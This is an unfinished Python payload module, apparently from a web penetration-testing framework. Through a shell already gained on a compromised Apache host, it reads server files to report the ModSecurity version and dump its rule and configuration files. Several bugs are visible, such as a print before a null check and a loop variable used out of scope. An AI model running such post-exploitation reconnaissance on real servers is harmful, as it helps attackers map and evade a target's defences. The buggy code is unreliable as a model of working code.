#NOT FINISHED
import re
from plugins.attack.payloads.base_payload import base_payload

class apache_modsecurity(base_payload):
    '''
    This payload shows ModSecurity version,rules and configuration files.
    '''
    def run_read(self):
        result = []
        modules = []
        files = []

        modules.append('mods-available/mod-security.load')
        modules.append('mods-available/mod-security2.load')


        def parse_version(binary):
            version = re.search('(?<=ModSecurity for Apache/)(.*?) ', binary)
            print version.group(0)
            if version:
                return version.group(0)
            else:
                return ''

        def parse_binary_location(module_config):
            binary = re.search('(?<=module )(.*)', module_config)
            if binary:
                return binary.group(0)
            else:
                return ''

        bin_location = []
        apache_config_files = run_payload('apache_config_files')
        apache_config_dir = run_payload('apache_config_directory')
        for file in apache_config_files:
            if re.search('security2_module', self.shell.read(file)) or re.search('security_module', self.shell.read(file)):
                bin_location.append(parse_binary_location(self.shell.read(file)))
                
        if bin_location == []:
            for dir in apache_config_dir:
                for module in modules:
                    if self.shell.read(dir+module):
                        bin_location.append(parse_binary_location(self.shell.read(dir+module)))

        bin=[]
        for location in bin_location:
            if location[0] != '/':
                bin.append('/usr/lib/apache2/'+location)
                bin.append('/usr/lib/httpd/'+location)
                bin.append('/usr/local/'+location)
                bin.append('/usr/lib/'+location)
                for item in bin:
                    if self.shell.read(item):
                        result.append('ModSecurity Version => '+parse_version(self.shell.read(item)))
            else:
                if self.shell.read(location):
                    result.append('ModSecurity Version => '+parse_version(self.shell.read(location)))


        files.append(dir+'conf/mod_security.conf')
        files.append(dir+'conf.d/mod_security.conf')
        files.append(dir+'modsecurity.d/modsecurity_crs_10_config.conf')
        files.append(dir+'modsecurity.d/modsecurity_crs_10_global_config.conf')
        files.append(dir+'modsecurity.d/modsecurity_localrules.conf')
        files.append(dir+'conf/modsecurity.conf')
        files.append(dir+'mods-available/mod-security.conf')

        for file in files:
            if self.shell.read(file) != '':
                result.append('-------------------------')
                result.append('FILE => '+file)
                result.append(self.shell.read(file))

        result = [p for p in result if p != '']
        return result
